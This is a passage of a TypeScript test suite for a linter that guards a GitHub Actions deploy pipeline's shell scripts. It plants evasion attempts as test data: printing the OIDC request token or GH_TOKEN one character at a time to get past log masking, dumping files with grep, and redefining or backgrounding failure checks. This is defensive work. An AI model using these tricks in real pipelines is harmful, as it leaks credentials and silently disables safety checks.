    expect(glue(`jq -c '.[]' <<<"$SERVICE_LIST" | jq -e '. == 1' >/dev/null`)).toMatch(
      /DPW-10 nonprod \(Read back what runs\)/,
    )
  })

  // COMMANDS-G1-03: jqPrintsOne read a [ after a } as a new array, while jq iterates the object's values, so
  // '{a: false, b: true}[]' printed two values, of which -e read the last.
  it('reads a [ after an object as iterating it (COMMANDS-G1-03)', () => {
    for (const program of ['{a: false, b: true}[]', '{a: 1} []', '{a: 1}[]?', '{a: .x, b: .y}[] | . == 1']) {
      expect(jqPrintsOne(program), program).toBe(false)
    }
    for (const program of ['{a: .x}["a"] == 1', '{a: 1} | [.a] | length == 1', '{a: 1} == {a: 1} and [1] == [1]']) {
      expect(jqPrintsOne(program), program).toBe(true)
    }
    const shape = 'all(.[]; type == "string" and test("^[0-9]{1,3}([.][0-9]{1,3}){3}$"))'
    const iterated = PROBE.replace(`'length == $n and ${shape}'`, `'{count: (length == $n), shape: ${shape}}[]'`)
    expect(iterated).not.toBe(PROBE)
    expect(canonicalTextFindings({ PROBE: iterated }).join('\n')).toMatch(
      /DPW-10 PROBE, line \d+: hands jq -e only a program that prints one value/,
    )
  })

  // FLOW-G1-01: GitHub reads a step id, output key or job output that nothing writes as '', with no error, so
  // the deploy job's mark step renamed with STEP_IDS (or its output with JOB_OUTPUTS, or the key its run writes)
  // left services_started empty and the pipeline's rollback off, and a rollback's done step renamed left rolled
  // empty, with its resmoke and record.
  it('binds every step and job output an expression reads to what writes it (FLOW-G1-01)', () => {
    const binding = (where: string) => `${DEPLOY}: DPW-10 ${where}: ${BINDING}`
    const found = (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile)
    expect(found(workflows)).toEqual([])
    for (const [name, planted, where] of [
      ['the mark step renamed', plant('        id: mark\n', '        id: started\n', job('nonprod')), 'nonprod'],
      ['prod’s mark step renamed', plant('        id: mark\n', '        id: started\n', job('prod')), 'prod'],
      ['the read-back step renamed', plant('        id: readback\n', '        id: read\n', job('nonprod')), 'nonprod'],
      [
        'the rollback’s done step renamed',
        plant('        id: done\n', '        id: finished\n', job('rollback-nonprod')),
        'rollback-nonprod',
      ],
      [
        'the output services_started renamed',
        plant(
          `      services_started: \${{ steps.mark.outputs.services_started }}\n`,
          `      started: \${{ steps.mark.outputs.services_started }}\n`,
          job('nonprod'),
        ),
        'rollback-nonprod',
      ],
      [
        'the key the mark step writes renamed',
        plant(
          'echo "services_started=true" >>"$GITHUB_OUTPUT"',
          'echo "started=true" >>"$GITHUB_OUTPUT"',
          job('nonprod'),
        ),
        'nonprod',
      ],
    ] as const) {
      expect(found(planted), name).toContain(binding(where))
    }
    // A step reading a step after it, or a job it doesn't need.
    const envOf = (jobId: string, stepName: string, added: string) => {
      const step = stepText(deployText, jobId, stepName)
      const at = step.indexOf('        env:\n')
      expect(at, stepName).toBeGreaterThan(-1)
      const changed = `${step.slice(0, at)}        env:\n          X: ${added}\n${step.slice(at + '        env:\n'.length)}`
      return withText(DEPLOY, edited(deployText, step, changed, job(jobId)))
    }
    expect(found(envOf('nonprod', 'What runs', `\${{ steps.mark.outputs.services_started }}`))).toContain(
      binding('nonprod (What runs)'),
    )
    expect(found(envOf('nonprod', 'What runs', `\${{ needs.smoke-prod.result }}`))).toContain(
      binding('nonprod (What runs)'),
    )
    // The gate's outputs are the keys history.ts's plan prints, key for key.
    expect(Object.keys(JOB_OUTPUTS.gate ?? {})).toEqual([...PLAN_OUTPUTS])
  })

  // Round 12: GitHub reads a workflow's blob, while the rules read the working tree, which a checkout writes
  // through git attributes: a working-tree-encoding of ISO-8859-1 wrote a NEL as one byte Node reads as U+FFFD,
  // so the lines GitHub read after it, a job naming prod-plan's environment among them, stayed in a comment. From
  // round 12's third iteration no tracked file carries one, since the owner reads every blob while CI and the
  // deploy jobs read the checkout (an ident attribute on infra/package.json checked out a lower CDK CLI than its
  // blob pinned), and the attributes are read as the index's .gitattributes gives them too: a .gitattributes
  // that gave itself a working-tree-encoding checked out, in a fresh clone, as text git's parser can't read, so
  // the working tree's reading named nothing while the checkout had re-encoded ci.yml through the index's.
  const ATTRIBUTE =
    'DPW-02 carries no git attribute, so a checkout writes its blob, which the owner reads and GitHub runs a workflow from, and CI, the deploy jobs and these rules read the same bytes (an ident, eol, text, filter or working-tree-encoding would write others)'
  it('refuses a git attribute on any file, as the working tree’s or the index’s .gitattributes gives it (round 12)', () => {
    expect(files).toContain(DEPLOY)
    expect(gitAttributeFindings(gitAttributes(files))).toEqual([])
    const folder = mkdtempSync(join(tmpdir(), 'hearth-attributes-'))
    try {
      const env = {
        PATH: process.env.PATH ?? '',
        HOME: folder,
        GIT_CONFIG_NOSYSTEM: '1',
        GIT_CONFIG_GLOBAL: '/dev/null',
      }
      const git = (cwd: string, args: readonly string[]) =>
        execFileSync(
          'git',
          [
            ...['-c', 'user.name=hearth-test', '-c', `user.email=${['test', 'example.invalid'].join('@')}`],
            ...['-c', 'commit.gpgsign=false', '-c', 'core.hooksPath=/dev/null', ...args],
          ],
          { cwd, encoding: 'utf8', env, stdio: ['ignore', 'pipe', 'pipe'] },
        )
      const ci = '.github/workflows/ci.yml'
      const source = join(folder, 'source')
      execFileSync('mkdir', ['-p', join(source, '.github/workflows'), join(source, 'infra')])
      git(source, ['init', '-q'])
      writeFileSync(join(source, ci), 'name: CI\n')
      writeFileSync(join(source, DEPLOY), 'name: Deploy\n')
      writeFileSync(join(source, 'infra/package.json'), '{}\n')
      const read = (paths: readonly string[], where = source) => gitAttributeFindings(gitAttributes(paths, where))
      writeFileSync(join(source, '.gitattributes'), `${ci} working-tree-encoding=ISO-8859-1\n*.md text\n`)
      expect(gitAttributes([ci, DEPLOY, 'x.md'], source).get(ci)).toEqual(['working-tree-encoding'])
      expect(read([ci, DEPLOY, 'x.md'])).toEqual([`${ci}: ${ATTRIBUTE}`, `x.md: ${ATTRIBUTE}`])
      writeFileSync(join(source, '.gitattributes'), '.github/** eol=crlf\n')
      expect(read([DEPLOY])).toEqual([`${DEPLOY}: ${ATTRIBUTE}`])
      writeFileSync(join(source, '.gitattributes'), 'infra/package.json ident\n')
      expect(read(['infra/package.json', DEPLOY])).toEqual([`infra/package.json: ${ATTRIBUTE}`])
      // The self-encoding .gitattributes, committed as its blob, as are the files, and cloned afresh.
      writeFileSync(
        join(source, '.gitattributes'),
        `.gitattributes working-tree-encoding=UTF-16LE-BOM\n${ci} working-tree-encoding=ISO-8859-1\n`,
      )
      for (const path of ['.gitattributes', ci, DEPLOY]) {
        const blob = git(source, ['hash-object', '-w', '--no-filters', path]).trim()
        git(source, ['update-index', '--add', '--cacheinfo', `100644,${blob},${path}`])
      }
      git(source, ['commit', '-qm', 'attributes'])
      git(folder, ['clone', '-q', source, 'job'])
      const job = join(folder, 'job')
      expect([...readFileSync(join(job, '.gitattributes')).subarray(0, 2)]).toEqual([0xff, 0xfe])
      expect(git(job, ['check-attr', '-z', '--all', '--', ci])).toBe('')
      expect(read([ci, DEPLOY], job)).toEqual([`${ci}: ${ATTRIBUTE}`])
    } finally {
      rmSync(folder, { recursive: true, force: true })
    }
  })
})

// Round 12, iteration 2: the gaps the finders proved past the reader and the rules after the first iteration's
// fixes, each planted as they planted it and found at its root.
describe('Round 12, iteration 2: the ways past the reader and the rules (DPW-07, DPW-10)', () => {
  const PROCESS_TOOL =
    'hands jq and gh only their held flags and a program written on the line, printf a single-quoted format whose one conversion is %s and a plain -v name, aws only its calls and options, tee only the summary and every other tool only its line as the guard writes it, and reads a file by a redirection only on such a line'
  const SHELL = `${GUARD}: DPW-10 PLAN_BASIS: is written in the shell shellViews() reads`
  const anchor = "  local step=$1 PART answer status basis=''\n"
  const line = PLAN_BASIS.slice(0, PLAN_BASIS.indexOf(anchor) + anchor.length).split('\n').length
  const plantedBasis = (added: string) => {
    expect(PLAN_BASIS).toContain(anchor)
    return PLAN_BASIS.replace(anchor, `${anchor}${added}`)
  }
  const tool = `${GUARD}: DPW-10 PLAN_BASIS, line ${line}: ${PROCESS_TOOL}`
  const grep = 'grep -o . "$RUNNER_TEMP/aws-cdk/package/package.json" >&2'
  const bs = '\\'

  // commandCode() blanks a [[ … ]] test's operands and a case's patterns from a [[ or case it reads at a command's
  // start, and it read one after a ! or { anywhere in a word (ready!, plan.{), after an escaped ;, | or & (plan\;),
  // and after a !, |, &, { or line break in a ${…} body, which the code view keeps as code; bash reads each as data,
  // so the commands from there to the next ]] or ) ran while no rule read them: a held tool printing a file one
  // character a line, or AWS_CHECK's refusal redefined to carry on.
  it('reads a ! or { as a command start only as a word of its own, and refuses an escaped operator or one in a parameter expansion’s body', () => {
    const redefined = 'aws_refuse() { echo "aws-check: $1, and so on"; }'
    const led = (lead: string, then = grep) => plantedBasis(`  ${lead} ; ${then}; [[ -n "$step" ]]\n`)
    for (const [what, planted] of [
      ['an in-word ! before [[', led('echo "plan_basis $step:" ready! [[')],
      ['an in-word { before [[', led('echo plan.{ [[')],
      [
        'an in-word ! before case',
        plantedBasis(`  echo "plan_basis $step:" ready! case it in ; ${grep}; case "$step" in plan) true ;; esac\n`),
      ],
    ] as const) {
      expect(canonicalTextFindings({ PLAN_BASIS: planted }), what).toContain(tool)
    }
    expect(canonicalTextFindings({ PLAN_BASIS: led('echo "plan_basis $step:" ready! [[', redefined) })).toContain(
      `${GUARD}: DPW-10 PLAN_BASIS, line ${line}: defines a function only by a plain lower-case name of its own, once: never a builtin's or keyword's (bash finds a function before a builtin, exit and return among them), one bash itself calls (command_not_found_handle), a command's a text or a run runs, or one another canonical text defines`,
    )
    for (const op of [';', '|', '&', '!', '{', '<', '>']) {
      expect(canonicalTextFindings({ PLAN_BASIS: led(`echo plan${bs}${op}[[`) }), op).toContain(SHELL)
    }
    for (const body of ['! [[ ', '| [[ ', '& [[ ', '{ [[ ', '\n  [[ ']) {
      expect(
        canonicalTextFindings({ PLAN_BASIS: plantedBasis(`  echo "\${step:+${body}}"; ${grep}; [[ -n "$step" ]]\n`) }),
        JSON.stringify(body),
      ).toContain(SHELL)
    }
    // bash reads each of those as data and runs the command after it, as the plants above assume.
    const ran = spawnSync(
      'bash',
      [
        '--noprofile',
        '--norc',
        '-c',
        `step=plan; echo ready! [[ ; echo one; [[ -n x ]]\necho "\${step:+! [[ }"; echo two\necho plan${bs};[[ ; echo three\necho plan.{ [[ ; echo four`,
      ],
      { encoding: 'utf8' },
    )
    expect(ran.stdout.split('\n').filter(each => /^(?:one|two|three|four)$/.test(each))).toEqual([
      'one',
      'two',
      'three',
      'four',
    ])
    expect(canonicalTextFindings()).toEqual([])
  })

  // A redirection standing before a command's word had its target read as one quoted or bare part alone, so with
  // an empty quote joined to it (<<<"$step"'', >&2'', 2>&1"") the line read as no command at all and the grep bash
  // ran after it was seen by no rule; a here-string is neither a write nor a read, which the other rules hold.
  it('reads a redirection’s target before a command’s word as a word of joined parts', () => {
    for (const lead of [`<<<"$step"''`, ">&2''", '2>&1""', '<<<a"$step"']) {
      expect(canonicalTextFindings({ PLAN_BASIS: plantedBasis(`  ${lead} ${grep}\n`) }), lead).toContain(tool)
    }
    expect(canonicalTextFindings()).toEqual([])
  })

  // An array's elements were read and their names dropped, so SEEN=("$ACTIONS_ID_TOKEN_REQUEST_TOKEN") on a
  // run's own line expanded the OIDC request token unseen by EXPANDS_ITS_OWN and made SEEN a name of the run's
  // own, which a held jq then printed one character apart, past GitHub's masking.
  it('reads the names an array’s elements expand on a run’s own lines (DPW-07)', () => {
    const OWN =
      "expands on its own lines only a name its step's or job's env: sets (never GH_TOKEN, which gh reads itself), one its run sets, a function's argument, the last status or the runner's outputs, summary, folder and run ids, so no line reads the OIDC request token or another credential the runner hands it"
    const before = '          plan_basis check\n'
    for (const added of [
      '          SEEN=("$ACTIONS_ID_TOKEN_REQUEST_TOKEN")\n',
      `          SEEN=("$ACTIONS_ID_TOKEN_REQUEST_TOKEN")\n          jq -nc --arg t "$SEEN" '$t | split("")'\n`,
      `          SEEN=(x "$GH_TOKEN")\n          jq -nc --arg t "$SEEN" '$t | split("")'\n`,
    ]) {
      expect(maskingFindings(addedBefore('prod', 'What runs', before, added)), added).toContain(
        `${DEPLOY}: DPW-07 prod (What runs): ${OWN}`,
      )
    }
    expect(maskingFindings(workflows)).toEqual([])
  })

  // jq reads each file it is given as inputs of its own, so a jq -e handed several files, or "${stackfiles[@]}",
  // reads the last alone, as one fed by a pipe does.
  it('refuses a jq -e given more than one file unless it is given -n or -s (DPW-10)', () => {
    for (const [text, lines] of [
      [`jq -e 'f' "$dir/manifest.json" "$dir/$file"`, [0]],
      [`jq -r -e '(.dockerImages // {}) | length == 0' "\${stackfiles[@]}" >/dev/null 2>&1`, [0]],
      [`jq --arg x y -e 'f' "$dir/manifest.json" "$dir/$file"`, [0]],
      [`jq -se 'all(.[]; f)' "$dir/manifest.json" "\${stackfiles[@]}"`, []],
      [`jq -ne 'true' "$dir/manifest.json" "$dir/$file"`, []],
      [`jq -e 'f' "$dir/manifest.json" >/dev/null`, []],
      [`jq -r 'f' "$dir/manifest.json" "$dir/$file"`, []],
    ] as const) {
      expect(jqPipedLines(text), text).toEqual(lines)
    }
    expect(canonicalTextFindings()).toEqual([])
  })

  // bindingFindings() took any <key>= in a step's run as the write of that output, a comment's included, and
  // AWS_CHECK's comment names replaced=, so its one write of replaced renamed or removed left nonprod's and prod's
  // replaced reading '' and every pipeline rollback rolling nothing back, with no finding.
  it('counts an output written only by a code line that opens the value (DPW-10)', () => {
    const binding = (where: string) => `${DEPLOY}: DPW-10 ${where}: ${BINDING}`
    const write = '              deploy | drill) echo "replaced=$release" >>"$GITHUB_OUTPUT" ;;\n'
    expect(deployText).toContain(write)
    expect(deployText).toContain(
      "# It writes go=true, or go=false, to the step's outputs (deploy and drill also replaced=<the release",
    )
    const found = (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile)
    for (const id of ['nonprod', 'prod']) {
      for (const [what, to] of [
        ['renamed', '              deploy | drill) echo "running=$release" >>"$GITHUB_OUTPUT" ;;\n'],
        ['a longer key', '              deploy | drill) echo "was_replaced=$release" >>"$GITHUB_OUTPUT" ;;\n'],
        ['removed', '              deploy | drill) ;;\n'],
      ] as const) {
        expect(found(plant(write, to, job(id))), `${id} ${what}`).toContain(binding(id))
      }
    }
    expect(found(workflows)).toEqual([])
  })
})

// Round 12, iteration 3: the gaps the finders proved past the reader and the rules after the second iteration's
// fixes, each planted as they planted it and found at its root.
describe('Round 12, iteration 3: the ways past the reader and the rules (DPW-07, DPW-10)', () => {
  const PROCESS_TOOL =
    'hands jq and gh only their held flags and a program written on the line, printf a single-quoted format whose one conversion is %s and a plain -v name, aws only its calls and options, tee only the summary and every other tool only its line as the guard writes it, and reads a file by a redirection only on such a line'
  const COMMANDS_RULE =
    "runs only the commands CANONICAL_COMMANDS names and the canonical texts' functions, each by a plain word, and hands them no environment of its own: export only on its listed lines, no flag to local or export, set only as -euo pipefail, no assignment before a command but IFS's before read, no wrapper and no variable that chooses what runs or that a rule holds to its one line"
  const anchor = "  local step=$1 PART answer status basis=''\n"
  const line = PLAN_BASIS.slice(0, PLAN_BASIS.indexOf(anchor) + anchor.length).split('\n').length
  const plantedBasis = (added: string) => {
    expect(PLAN_BASIS).toContain(anchor)
    return PLAN_BASIS.replace(anchor, `${anchor}${added}`)
  }
  const grep = 'grep -o . "$RUNNER_TEMP/aws-cdk/package/package.json" >&2'
  // A canonical text with whole lines replaced, each FROM found exactly once.
  const replaced = (text: string, ...pairs: ReadonlyArray<readonly [string, string]>) =>
    pairs.reduce((each, [from, to]) => {
      expect(each.split(from).length - 1, from).toBe(1)
      return each.replace(from, to)
    }, text)
  const bash = (script: string) => spawnSync('bash', ['--noprofile', '--norc', '-c', script], { encoding: 'utf8' })

  // A ! or { as an argument: the second iteration read a ! or { as a command start only as a word of its own, but
  // anywhere, while bash reads one so only where a command starts: echo x ! [[ hands echo the words ! and [[, and
  // the reader blanked from that [[ to the next ]] (or from a case to its next ) ), so the grep bash ran in between,
  // or a refusal redefined to carry on, was seen by no rule.
  it('reads a ! or { as a command start only where a command starts', () => {
    const led = (lead: string, then = grep) => plantedBasis(`  ${lead} ; ${then}; [[ -n "$step" ]]\n`)
    const tool = `${GUARD}: DPW-10 PLAN_BASIS, line ${line}: ${PROCESS_TOOL}`
    for (const [what, planted] of [
      ['an argument ! before [[', led('echo "plan_basis $step" ! [[')],
      ['an argument { before [[', led('echo "plan_basis $step" { [[')],
      [
        'an argument ! before case',
        plantedBasis(`  echo "plan_basis $step" ! case it in ; ${grep}; case "$step" in plan) true ;; esac\n`),
      ],
    ] as const) {
      expect(canonicalTextFindings({ PLAN_BASIS: planted }), what).toContain(tool)
    }
    expect(
      canonicalTextFindings({
        PLAN_BASIS: led('echo "plan_basis $step" ! [[', 'aws_refuse() { echo "aws-check: $1, and so on"; }'),
      }),
    ).toContain(
      `${GUARD}: DPW-10 PLAN_BASIS, line ${line}: defines a function only by a plain lower-case name of its own, once: never a builtin's or keyword's (bash finds a function before a builtin, exit and return among them), one bash itself calls (command_not_found_handle), a command's a text or a run runs, or one another canonical text defines`,
    )
    // bash hands echo the ! and the { as words, and runs the command after them.
    const ran = bash('step=plan; echo x ! [[ ; echo one; [[ -n x ]]\necho x { [[ ; echo two; [[ -n x ]]')
    expect(ran.stdout.split('\n').filter(each => /^(?:one|two)$/.test(each))).toEqual(['one', 'two'])
    // A ! or { where a command starts still starts one: a negated test, a group and a function's body.
    expect(shellCommands('if ! [[ -n "$x" ]]; then grep a b; fi').map(command => command.word)).toContain('grep')
    expect(shellCommands('true || { grep a b; }').map(command => command.word)).toContain('grep')
    expect(shellCommands('f() { grep a b; }').map(command => command.word)).toContain('grep')
    expect(shellCommands('function f { grep a b; }').map(command => command.word)).toContain('grep')
    expect(canonicalTextFindings()).toEqual([])
  })

  // Where a jq -e reads: JQ_PIPED_RULE asked whether a | stood before a jq -e, while what matters is where it
  // reads: a comment between the | and the jq, a helper its caller pipes into, a < <( … ), a group after the pipe
  // and get each fed it a stream the reader saw no pipe before, and -e held the last value alone, so AWS_CHECK's
  // every count is one passed with a service mid-rollout and another with no deployment.
  it('holds a jq -e to one file or a here-string of its own, never its standard input (DPW-10)', () => {
    for (const [text, lines] of [
      [`jq -c '.counts[]' <<<"$out" |\n  # Each count, one a line.\n  jq -e '. == 1' >/dev/null`, [2]],
      [`one_deployment() { jq -e '. == 1' >/dev/null; }\njq -c '.counts[]' <<<"$out" | one_deployment`, [0]],
      [`jq -e '. == 1' < <(jq -c '.counts[]' <<<"$out") >/dev/null`, [0]],
      [`jq -c '.counts[]' <<<"$out" | { true; jq -e '. == 1' >/dev/null; }`, [0]],
      [`jq -c '.counts[]' <<<"$out" | get jq -e '. == 1'`, [0]],
      [`jq -e 'all(.counts[]; . == 1)' <<<"$out" >/dev/null`, []],
      [`jq -e 'f' "$dir/manifest.json" >/dev/null`, []],
      [`jq -ne 'true'`, []],
      [`jq -c '.[]' <<<"$out" | jq -se 'all(.[]; . == 1)'`, []],
      [`jq -c '.counts[]' <<<"$out" | jq -r '.'`, []],
    ] as const) {
      expect(jqPipedLines(text), text).toEqual(lines)
    }
    const counts = '      jq -e \'all(.counts[]; . == 1)\' <<<"$out" >/dev/null ||\n'
    const helper = '# Whether ECR holds the digest $2 under a tag of commit $1.\n'
    for (const [what, planted] of [
      [
        'a comment between',
        replaced(AWS_CHECK, [
          counts,
          "      jq -c '.counts[]' <<<\"$out\" |\n        # Each service's deployment count, one a line, and each must be one.\n        jq -e '. == 1' >/dev/null ||\n",
        ]),
      ],
      [
        'a helper',
        replaced(
          AWS_CHECK,
          [
            helper,
            `# Whether the count on the input is one.\none_deployment() { jq -e '. == 1' >/dev/null; }\n${helper}`,
          ],
          [counts, '      jq -c \'.counts[]\' <<<"$out" | one_deployment ||\n'],
        ),
      ],
    ] as const) {
      expect(canonicalTextFindings({ AWS_CHECK: planted }).join('\n'), what).toContain(
        'hands jq -e no stream of values',
      )
    }
    // A run's own jq reads a here-string of its own, or its standard input counts as a pipe's: a group after a
    // pipe holds a jq no previous command feeds.
    const before = '          plan_basis check\n'
    const glue = (added: string) =>
      credentialedCodeFindings(
        addedBefore('prod', 'What runs', before, `          ${added}\n`),
        manifests,
        lockfile,
      ).some(each =>
        each.startsWith(`${DEPLOY}: DPW-10 prod (What runs): gives each command its own lines run only the flags`),
      )
    expect(glue(`jq -c '.[]' <<<"$BASIS" | { jq -e '. == 1' >/dev/null; }`)).toBe(true)
    expect(glue(`{ jq -e '. == 1' >/dev/null; } <<<"$BASIS"`)).toBe(true)
    expect(glue(`jq -e '. == 1' <<<"$BASIS" >/dev/null`)).toBe(false)
    // jq runs its program for each value it reads, and -e takes the last output alone.
    expect(bash(`printf '2\\n0\\n1\\n' | jq -e '. == 1' >/dev/null`).status).toBe(0)
    expect(bash(`jq -e 'all(.[]; . == 1)' <<<'[2,0,1]' >/dev/null`).status).toBe(1)
    expect(canonicalTextFindings()).toEqual([])
    expect(credentialedCodeFindings(workflows, manifests, lockfile)).toEqual([])
  })

  // A loop's do or done after &, ) or }: heldNameLines() paired a loop's do and done only after a line's start or
  // a ;, while bash also ends a loop's list at a do or done after &, a subshell's ) or a group's }, so : & done <
  // <(…) fed the held read of td from any line, and the held done line was left to close an until : & do : loop the
  // pairing never saw: the services' images read as the api's three times.
  it('refuses a held name read in a loop whose do or done it can’t pair (DPW-10)', () => {
    const loop = `        digests+=("\${image##*@}")\n      done < <(jq -r '.services[]' <<<"$out")\n`
    for (const [what, close, open] of [
      ['after an &', ': & done', 'until : & do :'],
      ['after a subshell', '(:) done', 'until (:) do :'],
    ] as const) {
      const planted = replaced(AWS_CHECK, [
        loop,
        `        digests+=("\${image##*@}")\n        ${close} < <(jq -r '.services[0], .services[0], .services[0]' <<<"$out")\n      ${open}\n      done < <(jq -r '.services[]' <<<"$out")\n`,
      ])
      expect(
        canonicalTextFindings({ AWS_CHECK: planted }).some(each =>
          each.includes("sets a name an aws value starts with, or one it is read from, only on its text's own lines"),
        ),
        what,
      ).toBe(true)
    }
    expect(bash(`while read -r x; do echo "$x"; : & done < <(printf 'decoy\\n')`).stdout).toBe('decoy\n')
    expect(canonicalTextFindings()).toEqual([])
  })

  // A check run in the background: no rule over a canonical text read & as a control operator, and bash runs the list
  // before it in a subshell of its own in the background, where its exit 1 ends that subshell alone and set -e
  // never sees its status; no text may wait for it. A refusal, a group, a subshell or an if … fi followed by & let
  // the step go on as if the check had passed.
  it('refuses an & that runs a check in the background (DPW-10)', () => {
    const SHELL = (name: string) => `${GUARD}: DPW-10 ${name}: is written in the shell shellViews() reads`
    // Each form after a refusal, and the same without its &.
    for (const form of [
      'release_shape "$release" &',
      '[ "$status" != UPDATE_ROLLBACK_FAILED ] || aws_refuse "the Services stack is UPDATE_ROLLBACK_FAILED" &',
      "{ jq -e 'length > 0' <<<\"$out\" >/dev/null || aws_refuse 'x'; } &",
      '( release_shape "$release" || aws_refuse \'x\' ) &',
      'if ! release_shape "$release"; then\n  exit 1\nfi &',
    ]) {
      expect(readsAsBash(form), form).toBe(false)
      expect(readsAsBash(form.replace(/ &$/, '')), form).toBe(true)
    }
    const step = plantedBasis('  { [ -n "$step" ] || exit 1; } &\n')
    expect(canonicalTextFindings({ PLAN_BASIS: step })).toContain(SHELL('PLAN_BASIS'))
    expect(canonicalTextFindings({ PLAN_BASIS: plantedBasis('  { [ -n "$step" ] || exit 1; }\n') })).toEqual([])
    // TASKS_OUTPUTS' shape check of the Tasks stack's outputs, its if … fi run in the background.
    const lines = TASKS_OUTPUTS.split('\n')
    const at = lines.findIndex((each, n) => /^\s*fi$/.test(each) && /^\s*exit 1$/.test(lines[n - 1] ?? ''))
    expect(at).toBeGreaterThan(0)
    lines[at] = `${lines[at]} &`
    expect(canonicalTextFindings({ TASKS_OUTPUTS: lines.join('\n') })).toContain(SHELL('TASKS_OUTPUTS'))
    // An & in a redirection, an and-or list or a case item's terminator is none.
    for (const text of ['a 2>&1 && b', 'a >&2', 'a &>/dev/null', 'a |& b', 'case x in a) b ;;& *) c ;; esac']) {
      expect(readsAsBash(text), text).toBe(true)
    }
    const ran = bash('set -e; { echo refused; exit 1; } & sleep 0.2; echo went on')
    expect(ran.status).toBe(0)
    expect(ran.stdout).toBe('refused\nwent on\n')
    expect(canonicalTextFindings()).toEqual([])
  })

  // An AWS_ name set by a builtin: the workflow-level rule read an AWS_ name set only as NAME=, so a builtin handed
  // AWS_REGION (a for loop, read, printf -v, local) moved every later aws read of the text to another region,
  // since the credentials action exports it for every later step.
  it('refuses an AWS_ name set by a builtin or an assignment in a canonical text (DPW-10)', () => {
    const at = `    release=$(jq -r '.[1] // ""' <<<"$out")\n`
    const where = AWS_CHECK.slice(0, AWS_CHECK.indexOf(at) + at.length).split('\n').length
    for (const added of [
      'for AWS_REGION in us-east-1; do break; done',
      'IFS= read -r AWS_REGION <<<"us-east-1"',
      "printf -v AWS_REGION '%s' us-east-1",
      'local AWS_REGION',
      'AWS_REGION=us-east-1',
      'local ROLE_TO_ASSUME=x',
    ]) {
      expect(canonicalTextFindings({ AWS_CHECK: replaced(AWS_CHECK, [at, `${at}    ${added}\n`]) }), added).toContain(
        `${GUARD}: DPW-10 AWS_CHECK, line ${where}: ${COMMANDS_RULE}`,
      )
    }
    expect(canonicalTextFindings()).toEqual([])
  })

  // An output's write sent to the log: a write was any code line opening <key>= after a quote, wherever the line
  // wrote it, so the mark's services_started, a rollback's rolled or AWS_CHECK's replaced sent to the log through
  // mask left the output reading '' and the pipeline's rollback off, with no finding.
  it('counts an output written only by a line that writes it to the output file (DPW-10)', () => {
    const binding = (where: string) => `${DEPLOY}: DPW-10 ${where}: ${BINDING}`
    const found = (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile)
    for (const [jobs, from] of [
      [['nonprod', 'prod'], 'echo "services_started=true" >>"$GITHUB_OUTPUT"'],
      [['rollback-nonprod', 'rollback-prod'], 'echo "rolled=true" >>"$GITHUB_OUTPUT"'],
      [['nonprod', 'prod'], 'deploy | drill) echo "replaced=$release" >>"$GITHUB_OUTPUT" ;;'],
    ] as const) {
      expect(deployText).toContain(from)
      for (const id of jobs) {
        const to = from.replace(' >>"$GITHUB_OUTPUT"', ' | mask')
        expect(found(plant(from, to, job(id))), `${id} ${from}`).toContain(binding(id))
      }
    }
    // A group whose closing line writes to the output writes each key in it.
    expect(deployText).toContain('            echo "readback=$READBACK"\n')
    expect(found(workflows)).toEqual([])
  })
})

// Round 12, iteration 4: the gaps the finders proved past the reader and the rules after the third iteration's
// fixes, each planted as they planted it and found at its root.
describe('Round 12, iteration 4: the ways past the reader and the rules (DPW-06, DPW-08, DPW-10, DPW-13)', () => {
  const PROCESS_TOOL =
    'hands jq and gh only their held flags and a program written on the line, printf a single-quoted format whose one conversion is %s and a plain -v name, aws only its calls and options, tee only the summary and every other tool only its line as the guard writes it, and reads a file by a redirection only on such a line'
  const EVALUATES = 'evaluates as arithmetic, a subscript, an offset, a name or a prompt only what it sets itself'
  const VERDICT_RULE =
    'exits or returns only with a literal status (a bare return only after ||, which returns the failing command’s), opens no subshell where a command starts and refuses inside no substitution (no exit, and no call of a function that exits, in a $( … ), <( … ) or >( … )), so no refusal ends its step with status 0 or a subshell alone'
  const VERDICT_ALONE =
    'runs each deploy of the CLI and smoke.ts standing alone, outside any substitution, pipeline, negation, and-or list (a group’s or subshell’s included) or condition but the drill’s if, so its failure ends the step'
  const grep = 'grep -o . "$RUNNER_TEMP/aws-cdk/package/package.json" >&2'
  const replaced = (text: string, ...pairs: ReadonlyArray<readonly [string, string]>) =>
    pairs.reduce((each, [from, to]) => {
      expect(each.split(from).length - 1, from).toBe(1)
      return each.replace(from, to)
    }, text)
  const bash = (script: string, cwd?: string) =>
    spawnSync('bash', ['--noprofile', '--norc', '-c', script], { encoding: 'utf8', cwd })
  const lineOf = (text: string, line: string) => text.split('\n').indexOf(line) + 1

  // A for loop with no in list sets its name from the positional parameters, a function's arguments: ASSIGNMENTS
  // read only for NAME in, so a helper's for version; do [ "$(( version ))" -le 8 ] evaluated each argument, a
  // value from the assembly, and a subscript's $( … ) in it ran. And a | in a substitution before read's name
  // stopped both readers of it.
  it('reads a for loop with no in list, and read past a | in a substitution, as setting a name from outside', () => {
    for (const text of [
      'f() {\n  local value\n  for value; do\n    [ "$(( value ))" -le 8 ] || return 1\n  done\n}\nf "$x"\n',
      'f() {\n  local value\n  for value do\n    [ "$(( value ))" -le 8 ] || return 1\n  done\n}\nf "$x"\n',
      'f() {\n  local count=0\n  IFS= read -r <<<"$(jq -r . <<<"$x" | grep -c .)" count\n  echo "$(( count ))"\n}\n',
    ]) {
      expect(outsideEvaluations(text), text).toEqual([3])
    }
    expect(outsideEvaluations('f() {\n  local n\n  for n in 1 2 3; do\n    echo "$(( n ))"\n  done\n}\n')).toEqual([])
    const helper = 'asset_refuse() {\n  echo "asset-check: $1"\n  exit 1\n}\n'
    const missing = "      asset_refuse 'a manifest has missing context, which the CLI would look up'\n"
    const check = '    [ "$(( version ))" -le 8 ] || return 1'
    const planted = replaced(
      ASSET_CHECK,
      [
        helper,
        `${helper}# Whether each bootstrap version a manifest's stacks require is at most hearthapp's (8).\nversions_held() {\n  local version\n  for version; do\n${check}\n  done\n}\n`,
      ],
      [
        missing,
        `${missing}    mapfile -t versions < <(jq -r '(.artifacts // {})[] | .properties.requiresBootstrapStackVersion // empty' "$dir/manifest.json")\n    versions_held "\${versions[@]}" || asset_refuse "a stack requires a bootstrap version hearthapp's bootstrap doesn't hold"\n`,
      ],
    )
    expect(canonicalTextFindings({ ASSET_CHECK: planted })).toContain(
